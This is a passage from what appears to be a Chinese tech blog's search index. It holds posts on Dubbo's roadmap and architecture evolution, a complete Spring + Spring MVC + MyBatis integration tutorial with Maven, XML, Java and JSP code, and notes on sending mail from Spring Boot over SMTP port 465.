可独立升级框架，减少业务侵入，而内嵌模式可以带业务测试、部署节点少、稳定性检测方便。同时，可以将 Dubbo3.0 启动为独立进程，由 dubbo-mesh 进行 IPC，路由、负载均衡和熔断机制将由独立进程控制。 2018 年 2 月 15 日，阿里将 Dubbo 开源贡献给 Apache，即 incubator-dubbo 总结，从 Dubbo 新版本的路线规划上可以看出，新版本的 Dubbo 在原有服务治理的功能基础上，将全面拥抱微服务和 Service Mesh。同时考虑到在阿里云已经有了 Dubbo 的商业版本，在未来一段时间内，Dubbo 的更新与维护应该不会再长时间中断。 Dubbo 官方介绍 第二届 Dubbo 开发者沙龙 PDF 资料 朱勇: Dubbo 开源现状与未来规划 潘志伟: Dubbo 在互金行业的应用场景 小马哥: Dubbo Cloud Native 之路的实践与思考 郭平: Nacos - 贡献 Dubbo 生态，阿里巴巴注册中心和配置中心开源计划 Dubbo 2.7 最典型的三个新特性 异步化改造 三大中心改造 服务治理增强 Dubbo 2.7 改动与升级说明 Dubbo 2.7 官方改动说明 Dubbo 2.7 升级与可能的兼容性问题总结 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"Dubbo 之一架构演进",url:"/posts/223fed88.html",text:'单一应用架构 优点 简单实用、便于维护，开发成本较低 缺点 部署麻烦，添加、修改个别模块功能，需要重新将所有模块的代码部署到各个服务器 单台服务器的性能有限，不适合对外提供所有模块功能 存在单点故障问题 关键点 数据访问框架（ORM） 垂直应用架构 优点 性能扩展比较容易 协同开发比较容易，每个独立的模块由对应的开发人员负责 缺点 每个模块都包含了 MVC 三层的所有代码 不适用页面经常修改的场景，如果单个模块对应的页面修改了，需要重新部署该模块的所有代码到服务器 各个模块之间不可能完全独立，大量应用之间需要相互交互，调用关系相对复杂 关键点 用于加速前端页面开发的 Web 框架（MVC） 分布式服务架构 优点 垂直和横向扩展都比较容易 前端页面可以快速迭代开发 提高了系统整体的高可用、高性能、高并发方面的能力 缺点 系统的复杂性提高了很多，包括开发与运维方面， 关键点 分布式服务框架 (RPC) 如何拆分业务与提高业务的复用程度 流动计算架构（SOA） 分布式架构中的服务越来越多，导致交互越发复杂，不可避免会出现资源浪费的情况。如何才能更好地管理复杂的调用关系、提高资源利用率、对整个服务集群进行动态控制呢？服务治理被引入来解决此问题。服务治理一般包括以下内容：1）通过注册中心管理所有服务（即服务注册与发现）2）路由选择、负载均衡及容错处理3）服务升、降级，熔断，权重调整4）服务过滤（黑名单、白名单）5）服务状态检测、监测6）服务权限控制7）服务依赖关系8）监控与统计9）资源隔离 Dubbo 官方的架构演进图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"架构 分布式"},{title:"Spring 整合 MyBatis 教程（SSM 整合）",url:"/posts/59033a11.html",text:'前言本文主要介绍 Spring + Spring MVC + MyBatis 整合（SSM），开发工具基于 Eclipse + Maven。值得一提的是，下文只给出 SSM 整合所需的最小配置内容，在生产环境需要适当优化项目的配置，尤其是 Log4j2、Druid 的配置。完整的项目代码可以直接从 GitHub 下载对应章节 ssm-study。 版本说明 名称 版本 Spring 4.3.2.RELEASE MyBatis 3.4.1 Druid 1.0.25 Log4j2 2.6.2 MySQL 5.7.26 官方整合案例 MyBatis JPetStore 准备工作数据库初始化本文的案例代码依赖以下数据库表结构，因此需要提前初始化好数据库才能运行项目。 1234567891011121314151617--- 创建数据库CREATE DATABASE `mybatis_lesson` DEFAULT CHARACTER SET utf8mb4;--- 创建数据库表CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `dept_id` int(11) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;--- 插入表数据insert into t_employee(id, last_name, gender, email) values(1, \'Jim\',\'1\', \'jim@gmail.com\');insert into t_employee(id, last_name, gender, email) values(2, \'Tom\',\'1\', \'tom@gmail.com\');insert into t_employee(id, last_name, gender, email) values(3, \'Peter\',\'1\', \'peter@gmail.com\'); 创建 Maven Web 项目在 Eclipse 内，提前创建好基于 Maven 的 Web 项目。由于篇幅有限，这里不再累述创建步骤，详细教程可看这里。 快速开始引入 Maven 依赖123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;11&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;11&lt;/maven.compiler.target&gt; &lt;log4j.version&gt;2.6.2&lt;/log4j.version&gt; &lt;mysql.version&gt;5.1.37&lt;/mysql.version&gt; &lt;druid.version&gt;1.0.25&lt;/druid.version&gt; &lt;mybatis.version&gt;3.4.1&lt;/mybatis.version&gt; &lt;mybatis-spring.version&gt;1.3.0&lt;/mybatis-spring.version&gt; &lt;servlet.version&gt;3.1.0&lt;/servlet.version&gt; &lt;spring.version&gt;4.3.2.RELEASE&lt;/spring.version&gt; &lt;gson.version&gt;2.7&lt;/gson.version&gt; &lt;commons-collections.version&gt;3.2.2&lt;/commons-collections.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;!-- Junit --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- Servlet --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.0.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- JSTL --&gt; &lt;dependency&gt; &lt;groupId&gt;taglibs&lt;/groupId&gt; &lt;artifactId&gt;standard&lt;/artifactId&gt; &lt;version&gt;1.1.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;jstl&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Log4j2 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- MySQL --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;${mysql.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Druid --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;${druid.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Mybatis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;${mybatis.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;${mybatis-spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring IOC --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-beans&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-expression&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring AOP --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-aop&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-aspects&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring Web --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-web&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring DAO --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-orm&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-tx&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring Test --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Common Tools --&gt; &lt;dependency&gt; &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt; &lt;artifactId&gt;gson&lt;/artifactId&gt; &lt;version&gt;${gson.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;${commons-collections.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建项目配置文件Log4j2 配置文件在 /src/main/resources 目录下创建 log4j2.xml 配置文件，其中的配置内容如下： 12345678910111213&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Configuration status="WARN"&gt; &lt;Appenders&gt; &lt;Console name="Console" target="SYSTEM_OUT"&gt; &lt;PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n" /&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level="error"&gt; &lt;AppenderRef ref="Console" /&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; 数据库配置文件在 /src/main/resources 目录下创建 db.properties 配置文件，其中的配置内容如下： 1234567891011jdbc.user=rootjdbc.password=123456jdbc.url=jdbc:mysql://127.0.0.1:3306/mybatis_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTCjdbc.miniPoolSize=10jdbc.maxPoolSize=30jdbc.initialPoolSize=1jdbc.maxWait=60000jdbc.timeBetweenEvictionRunsMillis=60000jdbc.minEvictableIdleTimeMillis=300000jdbc.preferredTestQuery=select 1 MyBatis 配置文件在 /src/main/resources 目录下创建 mybatis-config.xml 配置文件，用于存放 MyBatis 的全局核心配置信息，其中的配置内容如下： 123456789101112131415&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;&lt;configuration&gt; &lt;settings&gt; &lt;!-- 开启二级缓存 --&gt; &lt;setting name="cacheEnabled" value="true" /&gt; &lt;!-- 开启驼峰命名自动映射 --&gt; &lt;setting name="mapUnderscoreToCamelCase" value="true" /&gt; &lt;/settings&gt;&lt;/configuration&gt; Spring 配置文件Spring MVC 配置文件在 /src/main/resources 目录下创建 application-servlet.xml 配置文件，用于配置 Spring MVC 的运行，其中的配置内容如下： 1234567891011121314151617181920212223&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mvc="http://www.springframework.org/schema/mvc" xsi:schemaLocation="http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-4.0.xsd http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd"&gt; &lt;!-- Spring 扫描控制器组件 --&gt; &lt;context:component-scan base-package="com.clay.mybatis" use-default-filters="false"&gt; &lt;context:include-filter type="annotation" expression="org.springframework.stereotype.Controller" /&gt; &lt;/context:component-scan&gt; &lt;!-- Spring MVC 视图解析器 --&gt; &lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="prefix" value="/WEB-INF/pages/"&gt;&lt;/property&gt; &lt;property name="suffix" value=".jsp"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!-- Spring MVC 注解驱动 --&gt; &lt;mvc:annotation-driven&gt;&lt;/mvc:annotation-driven&gt; &lt;mvc:default-servlet-handler /&gt;&lt;/beans&gt; Spring Context 配置文件在 /src/main/resources 目录下创建 application-context.xml 配置文件，Spring 整合 MyBatis 的核心配置信息就写在里面（也就是定义 SqlSessionFactoryBean 的 Bean），其中的配置内容如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mybatis-spring="http://mybatis.org/schema/mybatis-spring" xmlns:tx="http://www.springframework.org/schema/tx" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://mybatis.org/schema/mybatis-spring http://mybatis.org/schema/mybatis-spring-1.2.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd"&gt; &lt;!-- 引入数据库配置文件 --&gt; &lt;context:property-placeholder location="classpath:db.properties" /&gt; &lt;!-- 扫描组件 --&gt; &lt;context:component-scan base-package="com.clay.mybatis"&gt; &lt;context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller" /&gt; &lt;/context:component-scan&gt; &lt;!-- 数据源 --&gt; &lt;bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource" init-method="init" destroy-method="close"&gt; &lt;property name="url" value="${jdbc.url}" /&gt; &lt;property name="username" value="${jdbc.user}" /&gt; &lt;property name="password" value="${jdbc.password}" /&gt; &lt;property name="maxActive" value="${jdbc.maxPoolSize}" /&gt; &lt;property name="initialSize" value="${jdbc.initialPoolSize}" /&gt; &lt;property name="maxWait" value="${jdbc.maxWait}" /&gt; &lt;property name="minIdle" value="${jdbc.miniPoolSize}" /&gt; &lt;property name="timeBetweenEvictionRunsMillis" value="${jdbc.timeBetweenEvictionRunsMillis}" /&gt; &lt;property name="minEvictableIdleTimeMillis" value="${jdbc.minEvictableIdleTimeMillis}" /&gt; &lt;property name="validationQuery" value="${jdbc.preferredTestQuery}" /&gt; &lt;property name="testWhileIdle" value="true" /&gt; &lt;property name="filters" value="stat" /&gt; &lt;/bean&gt; &lt;!-- 事务管理 --&gt; &lt;bean id="dataSourceTransactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;/bean&gt; &lt;!-- 开启基于注解的事务 --&gt; &lt;tx:annotation-driven transaction-manager="dataSourceTransactionManager" /&gt; &lt;!-- 定义 SqlSessionFactory --&gt; &lt;bean id="sqlSessionFactoryBean" class="org.mybatis.spring.SqlSessionFactoryBean"&gt; &lt;!-- 数据源 --&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;!-- 类型别名 --&gt; &lt;property name="typeAliasesPackage" value="com.clay.mybatis.bean" /&gt; &lt;!--指定 SQL 映射文件的位置 --&gt; &lt;property name="mapperLocations" value="classpath*:mapper/**/*.xml" /&gt; &lt;!-- 指定 MyBatis 全局配置文件的位置 --&gt; &lt;property name="configLocation" value="classpath:mybatis-config.xml" /&gt; &lt;/bean&gt; &lt;!-- 定义 SqlSessionTemplate --&gt; &lt;bean id="sqlSession" class="org.mybatis.spring.SqlSessionTemplate"&gt; &lt;constructor-arg name="sqlSessionFactory" ref="sqlSessionFactoryBean" /&gt; &lt;/bean&gt; &lt;!-- 扫描 MyBatis 的 Mapper 接口 --&gt; &lt;mybatis-spring:scan base-package="com.clay.mybatis.dao" /&gt; &lt;!-- 或者使用以下的配置来扫描 Mapper 接口 --&gt; &lt;!-- &lt;bean id="configure" class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt; &lt;property name="basePackage" value="com.clay.mybatis.dao"&gt;&lt;/property&gt; &lt;/bean&gt; --&gt;&lt;/beans&gt; 更改 web.xml 配置文件更改 /src/main/webapp/WEB-INF 目录下的 web.xml 的配置文件，其中的配置内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app version="3.0" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://JAVA.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"&gt; &lt;!-- Spring 配置 --&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:application-context.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;!-- Spring MVC 配置 --&gt; &lt;servlet&gt; &lt;servlet-name&gt;spring&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:application-servlet.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;spring&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;!-- 字符集编码过滤器 --&gt; &lt;filter&gt; &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;utf-8&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;forceEncoding&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt;&lt;/web-app&gt; 项目核心代码DAO 层 EmployeeMapper 12345678910111213141516package com.clay.mybatis.dao;import java.util.List;import org.apache.ibatis.annotations.Mapper;import com.clay.mybatis.bean.Employee;@Mapperpublic interface EmployeeMapper { public List&lt;Employee&gt; queryAll(); public boolean delEmpById(Long id);} Service 层 EmployeeService 12345678910111213package com.clay.mybatis.service;import java.util.List;import com.clay.mybatis.bean.Employee;public interface EmployeeService { public List&lt;Employee&gt; list(); public boolean deleteEmployee(Long id);} EmployeeServiceImpl 12345678910111213141516171819202122232425262728package com.clay.mybatis.service.impl;import java.util.List;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Service;import com.clay.mybatis.bean.Employee;import com.clay.mybatis.dao.EmployeeMapper;import com.clay.mybatis.service.EmployeeService;@Servicepublic class EmployeeServiceImpl implements EmployeeService { @Autowired private EmployeeMapper employeeMapper; @Override public List&lt;Employee&gt; list() { return this.employeeMapper.queryAll(); } @Override public boolean deleteEmployee(Long id) { return this.employeeMapper.delEmpById(id); }} Controller 层 HomePageController 123456789101112131415161718192021222324package com.clay.mybatis.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;@Controllerpublic class HomePageController { @RequestMapping("/") public String index() { return "index"; } @RequestMapping("/index.jsp") public String indexJsp() { return "index"; } @RequestMapping("/index.html") public String indexHtml() { return "index"; }} EmployeeController 1234567891011121314151617181920212223242526272829303132333435package com.clay.mybatis.controller;import java.util.List;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;import org.springframework.web.servlet.ModelAndView;import com.clay.mybatis.bean.Employee;import com.clay.mybatis.service.EmployeeService;@Controller@RequestMapping("/employee")public class EmployeeController { @Autowired private EmployeeService employeeService; @RequestMapping("/list") public ModelAndView list() { List&lt;Employee&gt; list = this.employeeService.list(); ModelAndView view = new ModelAndView("/employee/list", "employees", list); return view; } @ResponseBody @RequestMapping("/delete/{id}") public boolean deleteEmployee(@PathVariable("id") Long id) { return this.employeeService.deleteEmployee(id); }} JSP 页面代码提示 根据上面的 web.xml 配置文件，JSP 页面的源文件统一存放在 /src/main/webapp/WEB-INF/pages 目录下。 index.jsp 1234567891011&lt;%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;员工列表&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;a href="/ssm-study/employee/list/"&gt;查询所有员工信息&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; /employee/list.jsp 123456789101112131415161718192021222324252627&lt;%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%&gt;&lt;%@taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;员工列表&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;id&lt;/th&gt; &lt;th&gt;lastName&lt;/th&gt; &lt;th&gt;email&lt;/th&gt; &lt;th&gt;gender&lt;/th&gt; &lt;/tr&gt; &lt;c:forEach items="${requestScope.employees}" var="employee"&gt; &lt;tr&gt; &lt;td&gt;${employee.id }&lt;/td&gt; &lt;td&gt;${employee.lastName }&lt;/td&gt; &lt;td&gt;${employee.email }&lt;/td&gt; &lt;td&gt;${employee.gender }&lt;/td&gt; &lt;/tr&gt; &lt;/c:forEach&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; SQL 映射文件提示 根据上面的 application-context.xml 配置文件，SQL 映射文件统一存放在 /src/main/resources/mapper 目录下。 123456789101112131415161718&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="queryAll" resultType="Employee"&gt; select id, last_name, gender, email from t_employee &lt;/select&gt; &lt;delete id="delEmpById" parameterType="Long"&gt; delete from t_employee where id = #{id} &lt;/delete&gt;&lt;/mapper&gt; 项目代码测试在 Eclipse 内将项目部署到 Tomcat 服务器，然后浏览器打开 http://127.0.0.1:8080/ssm-study/employee/list/，若看到下面的页面内容，则说明 Spring 成功整合了 MyBatis。 项目完整的目录结构图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"SpringBoot 开发随笔",url:"/posts/4e06a2ec.html",text:'Spring Boot 配置邮件发送在本地开发环境测试，Spring Boot 能够正常发送邮件，但部署到阿里云 ECS 服务器以后，一直没有收到邮件，部分关键日志信息如下： 12345678org.springframework.mail.MailSendException: Mail server connection failed; nested exception is com.sun.mail.util.MailConnectException: Couldn\'t connect to host, port: smtp.163.com, 25; timeout -1; nested exception is: java.net.ConnectException: 连接超时 (Connection timed out). Failed messages: com.sun.mail.util.MailConnectException: Couldn\'t connect to host, port: smtp.163.com, 25; timeout -1; nested exception is: java.net.ConnectException: 连接超时 (Connection timed out) at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:447) at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:322) at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:311) 从现有情况看，跟程序运行环境有关，查看相关资料，发现在阿里云 ECS 服务器上，默认禁用了 25 端口，所以在通过 25 端口去连接邮件服务器时，无法连上，就报超时了。官方建议使用 465 端口，而 456 端口是 SSL 协议的，所以不仅要换端口，还需要进行 SSL 协议替换。下面是在 application.properties 进行的邮件发送相关配置，经过这样配置后，在阿里 ECS 上就能够正常发送邮件了 123456789101112131415# Mail Configspring.mail.host=smtp.163.comspring.mail.username=xxx@163.comspring.mail.password=xxxxxspring.mail.properties.mail.smtp.auth=truespring.mail.properties.mail.smtp.starttls.enable=truespring.mail.properties.mail.smtp.starttls.required=true# SSL Configspring.mail.port=465spring.mail.protocol=smtpspring.mail.default-encoding=UTF-8spring.mail.properties.mail.smtp.ssl.enable=truespring.mail.properties.mail.smtp.socketFactory.port=465spring.mail.properties.mail.smtp.socketFactory.class=javax.net.ssl.SSLSocketFactory 163 邮箱相关服务器信息如下： 激活不同的配置文件使用命令行运行 SpringBoot 应用时，可以通过 --spring.profiles.active 来激活不同环境的配置文件。 1java -jar order-service-v1.0.jar --spring.profiles.active=dev bootstrap.yml 与 application.yml 的区别加载顺序 bootstrap.yml &gt; application.yml &gt; application-dev.yml bootstrap.yml 作用于应用程序上下文的引导阶段，bootstrap.yml 由父 Spring ApplicationContext 加载 若 bootstrap.yml 和 application.yml 在同一目录下时，bootstrap.yml 先加载，application.yml 后加载 若 application.properties 和 application.yml 在同一目录下时，且存在相同的配置，则 application.properties 会覆盖 application.yml 里面的属性，因为 application.properties 会后加载，也就是说哪个文件被最后加载，哪个才具有最高级 配置区别 bootstrap.yml 